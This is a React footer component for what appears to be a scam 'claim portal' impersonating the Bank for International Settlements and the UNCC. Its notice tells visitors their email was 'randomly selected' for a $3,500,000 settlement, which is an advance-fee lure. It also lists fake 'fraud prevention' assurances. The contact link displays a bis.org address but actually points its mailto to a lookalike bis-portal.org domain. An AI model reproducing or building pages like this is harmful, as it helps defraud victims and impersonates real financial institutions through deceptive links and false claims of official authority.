
import React from 'react';
import { Landmark, Mail, Lock, ShieldAlert } from 'lucide-react';

const Footer: React.FC = () => {
  return (
    <footer className="bg-slate-50 border-t border-slate-200 pt-16 pb-8">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-12 mb-12">
          <div className="space-y-4">
            <div className="flex items-center gap-2">
              <Landmark className="w-6 h-6 text-blue-700" />
              <div className="flex flex-col">
                <span className="text-base font-bold text-slate-900">BIS Settlement</span>
                <span className="text-[10px] text-slate-500 font-semibold tracking-widest uppercase">Global Operations</span>
              </div>
            </div>
            <p className="text-slate-500 text-sm leading-relaxed">
              The official verification and claim portal for the Bank for International Settlement 
              in partnership with the UNCC compensation committee 2025.
            </p>
          </div>

          <div>
            <h4 className="font-bold text-slate-900 mb-4 flex items-center gap-2">
              <ShieldAlert className="w-4 h-4 text-blue-700" /> Fraud Prevention
            </h4>
            <ul className="space-y-2 text-sm text-slate-500">
              <li>• Official BIS/CPM/025 verification</li>
              <li>• Encrypted claim submission</li>
              <li>• BIS Accredited bank verification</li>
              <li>• Indivisible fund allocation</li>
            </ul>
          </div>

          <div>
            <h4 className="font-bold text-slate-900 mb-4 flex items-center gap-2">
              <Mail className="w-4 h-4 text-blue-700" /> Committee Contact
            </h4>
            <p className="text-sm text-slate-500 mb-2">
              Directed to the Committee on Payment and Market Infrastructures (CPMI):
            </p>
            <a href="mailto:settlement@bis-portal.org" className="text-blue-700 font-medium hover:underline">
              cpmi-settlement@bis.org
            </a>
          </div>
        </div>

        <div className="border-t border-slate-200 pt-8 text-center">
          <div className="bg-blue-50 border border-blue-100 rounded-lg p-5 mb-8 max-w-4xl mx-auto">
            <p className="text-[11px] text-blue-900 font-semibold leading-relaxed">
              OFFICIAL NOTICE: Your transfer is irrevocable, indivisible and non-transferable. 
              Email addresses are randomly selected from global databases to qualify for recovery of lost funds or compensation. 
              The BIS 2025 initiative ensures direct disbursement of the $3,500,000.00 settlement to the owner of this session's verified data.
            </p>
          </div>
          <p className="text-slate-400 text-[10px] tracking-widest uppercase">
            © {new Date().getFullYear()} Bank for International Settlement (BIS) & UNCC. All rights reserved.
          </p>
        </div>
      </div>
    </footer>
  );
};

export default Footer;
